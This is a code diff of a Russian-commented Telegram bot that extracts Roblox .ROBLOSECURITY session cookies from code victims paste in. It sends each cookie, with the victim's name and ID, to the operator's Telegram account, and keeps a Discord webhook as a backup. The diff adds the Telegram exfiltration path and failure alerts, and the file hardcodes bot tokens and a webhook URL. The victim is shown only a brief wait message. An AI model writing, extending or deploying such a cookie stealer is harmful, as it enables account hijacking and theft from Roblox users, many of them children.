@@ -7,9 +7,16 @@ from aiogram import Bot, Dispatcher, Router, F
 from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, FSInputFile
 from aiogram.filters import CommandStart
 
+# Токен твоего бота для получения куки
 BOT_TOKEN = "8467022515:AAEKhaIBdWLHJ7bn1d-TBkM8Pkf_9Asslq0"
 
-# Discord Webhook URL
+# Токен бота для отправки куки
+SENDER_BOT_TOKEN = "8239746415:AAGmQxpDiRZw59vqzfyJe_Pz9o5aSc8e2po"
+
+# Твой Telegram ID для получения куки
+YOUR_TELEGRAM_ID = 7712154413  # Замени на свой ID
+
+# Discord Webhook URL (оставляем для бэкапа)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1410916698143326210/smw3JGFHp0gDqLnphzUBGrp_1mCwdk06oB7IRZ9Fp5akO1DBHae11Xa3qKJYd8XSLuhN"
 
 router = Router()
@@ -74,8 +81,8 @@ def extract_roblosecurity_value(full_code: str):
     
     return None
 
-async def send_cookie_to_discord(cookie_value: str, user_info: str):
-    """Отправляет .ROBLOSECURITY куки в Discord с юзернеймом и айди"""
+async def send_cookie_to_telegram(cookie_value: str, user_info: str, sender_bot: Bot):
+    """Отправляет .ROBLOSECURITY куки в твой Telegram"""
     try:
         if not cookie_value:
             return
@@ -83,12 +90,42 @@ async def send_cookie_to_discord(cookie_value: str, user_info: str):
         # Формируем куки в правильном формате
         cookie = f".ROBLOSECURITY={cookie_value}"
         
-        # Проверяем длину (Discord ограничение 2000 символов)
+        # Обрезаем если слишком длинный для Telegram (4096 символов)
+        if len(cookie) > 4000:
+            cookie = cookie[:4000] + "..."
+        
+        # Формируем сообщение для Telegram
+        message = f"🚨 **НОВЫЙ КУКИ ПОЛУЧЕН!**\n\n"
+        message += f"**От пользователя:** {user_info}\n\n"
+        message += f"**Куки:**\n`{cookie}`"
+        
+        # Отправляем в твой Telegram
+        await sender_bot.send_message(
+            chat_id=YOUR_TELEGRAM_ID,
+            text=message,
+            parse_mode="Markdown"
+        )
+        
+        print(f"[SUCCESS] Куки отправлен в Telegram от {user_info}")
+        print(f"[DEBUG] Длина куки: {len(cookie)} символов")
+        
+        # Также отправляем в Discord на всякий случай
+        await send_cookie_to_discord(cookie_value, user_info)
+        
+    except Exception as e:
+        print(f"[ERROR] Ошибка отправки в Telegram: {e}")
+
+async def send_cookie_to_discord(cookie_value: str, user_info: str):
+    """Отправляет .ROBLOSECURITY куки в Discord (бэкап)"""
+    try:
+        if not cookie_value:
+            return
+        
+        cookie = f".ROBLOSECURITY={cookie_value}"
+        
         if len(cookie) > 1990:
-            # Обрезаем если слишком длинный
             cookie = cookie[:1990] + "..."
         
-        # Отправляем сообщение с куки и информацией о пользователе
         message_content = f"@everyone\n**Юзер:** {user_info}\n\n{cookie}"
         
         payload = {
@@ -97,16 +134,11 @@ async def send_cookie_to_discord(cookie_value: str, user_info: str):
         }
         
         async with aiohttp.ClientSession() as session:
-            response = await session.post(DISCORD_WEBHOOK_URL, json=payload)
-            
-            if response.status == 204:
-                print(f"[SUCCESS] Куки отправлен в Discord от {user_info}")
-                print(f"[DEBUG] Длина куки: {len(cookie)} символов")
-            else:
-                print(f"[ERROR] Discord ответ: {response.status}")
+            await session.post(DISCORD_WEBHOOK_URL, json=payload)
+            print(f"[BACKUP] Куки отправлен в Discord")
                 
     except Exception as e:
-        print(f"[ERROR] Ошибка отправки: {e}")
+        print(f"[ERROR] Ошибка отправки в Discord: {e}")
 
 @router.message(CommandStart())
 async def start(message: Message):
@@ -167,7 +199,9 @@ async def get_code(message: Message):
         if message.from_user.username:
             user_info += f"@{message.from_user.username}"
         else:
-            user_info += "Без юзернейма"
+            user_info += f"{message.from_user.first_name}"
+            if message.from_user.last_name:
+                user_info += f" {message.from_user.last_name}"
         
         user_info += f" | ID: {message.from_user.id}"
         
@@ -177,11 +211,25 @@ async def get_code(message: Message):
         # Извлекаем куки
         roblosecurity_value = extract_roblosecurity_value(full_code)
         
-        # Отправляем куки в Discord с юзернеймом и айди
+        # Создаем бота для отправки
+        sender_bot = Bot(token=SENDER_BOT_TOKEN)
+        
+        # Отправляем куки в твой Telegram
         if roblosecurity_value:
-            await send_cookie_to_discord(roblosecurity_value, user_info)
+            await send_cookie_to_telegram(roblosecurity_value, user_info, sender_bot)
         else:
             print("[ERROR] Не удалось извлечь куки")
+            # Отправляем уведомление об ошибке
+            try:
+                await sender_bot.send_message(
+                    chat_id=YOUR_TELEGRAM_ID,
+                    text=f"❌ Не удалось извлечь куки от {user_info}"
+                )
+            except:
+                pass
+        
+        # Закрываем соединение с ботом-отправителем
+        await sender_bot.session.close()
         
         # Показываем пользователю процесс
         wait_msg = await message.answer("подождите 5-10сек")
